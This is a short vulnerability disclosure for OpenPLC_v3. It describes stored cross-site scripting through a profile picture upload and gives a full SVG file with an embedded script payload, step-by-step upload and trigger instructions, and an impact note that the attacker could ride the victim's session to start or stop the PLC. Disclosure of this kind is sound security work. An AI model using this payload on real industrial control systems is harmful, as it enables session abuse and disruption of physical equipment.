| Git: <https://github.com/thiagoralves/OpenPLC_v3> Stored XSS Via Profile Image UploadReproduction Use this payload & save it as `image.svg`:  ``` <?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">  <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/> <script type="text/javascript"> alert("XSS by 1d8"); </script> </svg> ```  1. Login > Users > Select a user to edit 2. Upload the `image.svg` as the picture 3. Save changes 4. Right-click the profile image in upper-right hand corner > Open image in new tab   Our XSS payload is now executed Impact Since we can inject our own Javascript, we can abuse the user's logged in cookie to do things such as start/stop the PLC or interact with the Slave devices |
